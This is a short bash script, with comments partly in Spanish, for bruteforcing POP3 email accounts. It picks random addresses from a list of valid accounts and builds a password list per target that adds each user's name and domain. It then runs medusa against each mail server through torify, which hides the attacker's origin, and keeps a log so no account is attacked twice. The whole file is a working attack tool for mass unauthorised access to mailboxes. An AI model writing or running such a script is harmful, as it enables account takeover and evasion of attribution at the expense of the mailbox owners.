#!/bin/bash
#Script to bruteforce POP3
#
USER_ACCOUNTS="direcciones_validas.txt"
DEFAULT_PASSWORDS="passwords.txt"
LOG="medusa.log"

#return the number of entrys in the medusa log
function wasAnalized()
{
    #is this user in the log of medusa?
    echo $(grep $1 $LOG | wc -l)

}

while [ 1 ]; do
    #random bucle with log control to filter accounts that already was bruteforcered
    for i in $(shuf -n 250 $USER_ACCOUNTS); do 
        
        #flag to deterimne if the account already was analized/attacked
        FLAG_ATTACKED=$(echo $(wasAnalized $i))
        if [ $FLAG_ATTACKED -eq 0 ]; then
    
            echo "---<[ Attacking $i ]>---"
    
            #update the unique log
            echo $i>>$LOG
            
            #make temporal passwords file thats exlusive for this account
            TEMPORAL_PASSWORDS=$(mktemp)
            #get the acount data
            user=$(echo $i |awk -F@ {'print $1'})
            domain=$(echo $i| awk -F@ {'print $2'})
            domain_only=$(echo $domain| awk -F. {'print $1'})
            
            #generate user custom passwords, password=username and the domainname, the username in smtp is user@domain, thats not fine.
            cat passwords.txt >$TEMPORAL_PASSWORDS
            echo $user >>$TEMPORAL_PASSWORDS
            echo $domain_only >>$TEMPORAL_PASSWORDS
            
            #hydra command line
            # hydra -w 5 -e n -t 2 -l $i -P $TEMPORAL_PASSWORDS smtp://$domain -vV
            #torify medusa -h $domain -u $i -P $TEMPORAL_PASSWORDS -O $LOG -e n -M pop3
            torify medusa -h $domain -u $i -p 123456 -O $LOG -M pop3 -b
            #SUCCESS
            
            #delete temporary files
            rm $TEMPORAL_PASSWORDS        
        fi
    
    done
done
